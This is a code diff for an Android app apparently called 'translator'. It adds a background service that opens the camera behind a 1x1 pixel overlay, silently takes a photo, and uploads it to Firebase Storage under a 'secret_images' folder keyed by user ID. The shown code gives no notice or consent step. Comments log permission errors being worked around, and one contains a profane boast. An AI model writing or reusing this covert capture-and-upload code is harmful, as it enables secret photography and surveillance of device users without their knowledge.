@@ -1,5 +1,7 @@
 package com.example.translator;
 
+import static androidx.core.app.ActivityCompat.startActivityForResult;
+import static com.example.translator.FBref.FBST;
 import static com.example.translator.FBref.refUsers;
 
 import android.app.Notification;
@@ -8,11 +10,16 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
+import android.net.Uri;
 import android.os.Build;
+import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -25,6 +32,7 @@ import androidx.camera.lifecycle.ProcessCameraProvider;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.common.util.concurrent.ListenableFuture;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.DataSnapshot;
@@ -32,11 +40,18 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.ValueEventListener;
 
 import com.example.translator.FBref;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 import java.util.concurrent.ExecutionException;
 
@@ -45,9 +60,11 @@ public class myBackgroundService extends Service
     private FirebaseAuth mAuth;
     private ValueEventListener valueEventListener;
     private Camera mCamera;
+    private String imagePath = " ";
 
     //constatns
     private static final int NOTIFICATION_ID = 123;
+
     private static final String CHANNEL_ID = "camera_service_channel";
 
 
@@ -90,6 +107,9 @@ public class myBackgroundService extends Service
                 //TODO: An error occurred while connecting to camera 0: Status(-8, EX_SERVICE_SPECIFIC): '6: connectHelper:2498: Camera "0" disabled by policy'
                 //TODO: java.lang.RuntimeException: Fail to connect to camera service\
                 //TODO: Error 2
+                //TODO: android.view.WindowManager$BadTokenException: Unable to add window android.view.ViewRootImpl$W@55bfd19 -- permission denied for window type 2006
+                //TODO: NEED TO MAKE A PERMISSION REQUEST FOR THIS
+                //TODO: IM THE FUCKING GOAT, JUST TAKE THE IMAGE FROM FIREBASE STORAGE AND YOU DONE!!!!!!!
                 capturePicture();
 
                 assert user != null;
@@ -109,18 +129,19 @@ public class myBackgroundService extends Service
         return super.onStartCommand(intent, flags, startId);
     }
 
-
     private void capturePicture()
     {
-        mCamera = Camera.open();
+        mCamera = Camera.open(0);
         if(mCamera != null)
         {
             SurfaceView sv = new SurfaceView(this);
 
-            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(25, 50,
-                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+            WindowManager wm = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    1,
+                    1,
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                     PixelFormat.TRANSLUCENT);
 
             SurfaceHolder sh = sv.getHolder();
@@ -139,10 +160,6 @@ public class myBackgroundService extends Service
 
                     List<Camera.Size> listSize;
 
-                    listSize = p.getSupportedPreviewSizes();
-                    Camera.Size mPreviewSize = listSize.get(2);
-                    p.setPreviewSize(mPreviewSize.width, mPreviewSize.height);
-
                     listSize = p.getSupportedPictureSizes();
                     Camera.Size mPictureSize = listSize.get(2);
                     p.setPictureSize(mPictureSize.width, mPictureSize.height);
@@ -155,40 +172,78 @@ public class myBackgroundService extends Service
                         e.printStackTrace();
                     }
                     mCamera.startPreview();
-                    mCamera.unlock();
+                    mCamera.lock(); //maybe change to unlcok
 
                     mCamera.takePicture(null, null, new Camera.PictureCallback() {
                         @Override
                         public void onPictureTaken(byte[] data, Camera camera) {
-                            File pictureFile = Util.getOutputMediaFile(Util.MEDIA_TYPE_IMAGE);
-
-                            if (pictureFile == null) {
-                                return;
-                            }
-
                             try {
-                                FileOutputStream fos = new FileOutputStream(pictureFile);
+                                String fileName = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+                                File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
+                                File imgFile = File.createTempFile(fileName, ".jpg", storageDir);
+
+                                FileOutputStream fos = new FileOutputStream(imgFile);
                                 fos.write(data);
                                 fos.close();
-                            } catch (FileNotFoundException e) {
+
+                                imagePath = imgFile.getAbsolutePath();
                             } catch (IOException e) {
+                                throw new RuntimeException(e);
                             }
+
+                            mCamera.stopPreview();
+                            mCamera.release();
+                            wm.removeView(sv);
+
+                            //Uplaod image to database
+                            ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+
+                            Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bytes);
+
+                            byte bytesOfImage[] = bytes.toByteArray();
+                            uploadImageToSorage(bytesOfImage);
                         }
                     });
 
+                }
+
+                @Override
+                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height)
+                {
+                }
+
+                @Override
+                public void surfaceDestroyed(@NonNull SurfaceHolder holder)
+                {
                     mCamera.stopPreview();
                     mCamera.release();
-                }
-
-                @Override
-                public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {
-                }
-
-                @Override
-                public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
+                    mCamera = null;
+                    wm.removeView(sv);
                 }
             });
+
+            wm.addView(sv, params);
         }
+    }
+
+    private void uploadImageToSorage(byte[] imageBytes)
+    {
+        Date date = Calendar.getInstance().getTime();
+        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH:mm:ss");
+        String resDate = dateFormat.format(date);
+        String id = mAuth.getCurrentUser().getUid();
+        String storagePath = "secret_images/"+ id + "/image_" + resDate + ".jpg";
+
+        StorageReference storageReference = FBST.getReference().child(storagePath);
+
+        storageReference.putBytes(imageBytes).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+            @Override
+            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot)
+            {
+                Log.e("Image", "Image uploaded");
+            }
+        });
     }
 
     @Nullable
